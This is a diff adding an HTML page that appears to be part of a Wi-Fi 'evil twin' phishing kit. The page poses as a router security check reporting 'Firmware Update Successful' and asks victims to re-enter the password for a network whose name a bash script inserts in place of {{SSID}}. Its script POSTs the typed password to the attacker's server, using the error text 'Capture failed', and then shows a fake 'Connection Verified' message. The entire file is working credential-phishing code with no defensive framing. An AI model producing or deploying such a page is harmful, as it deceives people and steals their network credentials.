@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Check</title>
+    <style>
+        :root {
+            --bg-color: #000000;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --input-bg: rgba(0, 0, 0, 0.5);
+            --text-color: #e0e0e0;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 30px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 24px;
+            text-align: center;
+        }
+        .skull-img {
+            width: 140px;
+            height: auto;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.15));
+            animation: float 6s ease-in-out infinite;
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+            100% { transform: translateY(0px); }
+        }    
+        input {
+            width: 100%; padding: 16px; margin-bottom: 10px;
+            background: var(--input-bg); border: none; border-radius: 12px;
+            color: #fff; font-size: 16px; outline: none;
+            -webkit-text-security: disc;
+        }
+        button {
+            width: 100%; padding: 16px; background: #fff; color: #000;
+            border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer;
+        }
+        .success-message {
+            display: none; color: #4ade80; font-weight: bold; margin-top: 20px; font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="login-box">
+        <!-- Ensure monk.png is in the same folder -->
+        <img src="monk.png" alt="Security" class="skull-img">
+
+        <h1 style="font-size:16px; margin-bottom:10px;">Firmware Update Successful</h1>
+        
+        <h1 style="font-size:16px; margin-bottom:10px;">Authentication Required</h1>
+        
+        <!-- The placeholder {{SSID}} will be replaced by your bash script using sed -->
+        <p style="color:#888; margin-bottom:20px;">Enter password for <b>{{SSID}}</b></p>
+
+        <div class="input-group">
+            <input type="text" id="password" placeholder="Wi-Fi Password" autocomplete="off" onkeydown="if(event.key === 'Enter') sendCreds()">
+        </div>
+        
+    <button onclick="sendCreds()" id="btn">Connect</button>
+
+        <div class="success-message" id="success-msg">
+            ✓ Connection Verified<br>
+            <span style="font-size:14px; color:#888; font-weight:normal;">You may close this window</span>
+        </div>
+    </div>
+
+    <script>
+        function sendCreds() {
+        var pass = document.getElementById("password").value;
+        var btn = document.getElementById("btn");
+        if (pass.length < 1) return;
+        btn.innerText = "Verifying...";
+        btn.style.opacity = "0.7";
+        fetch("/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "password=" + encodeURIComponent(pass)
+        })
+        .then(function(resp) {
+        if (!resp.ok) throw new Error("Capture failed");
+        btn.innerText = "Connected";
+        btn.style.opacity = "1";
+        document.getElementById("password").style.display = "none";
+        document.getElementById("success-msg").style.display = "block";
+        setTimeout(function() {
+        var form = document.createElement("form");
+        form.method = "POST";
+        form.action = "/connect";
+        document.body.appendChild(form);
+        form.submit();
+        }, 800);
+        })
+        .catch(function() {
+        btn.innerText = "Connect";
+        btn.style.opacity = "1";
+        document.getElementById("password").value = "";
+        document.getElementById("password").setAttribute("placeholder", "Incorrect password. Try again.");
+        });
+        }
+    </script>
+</body>
+</html>
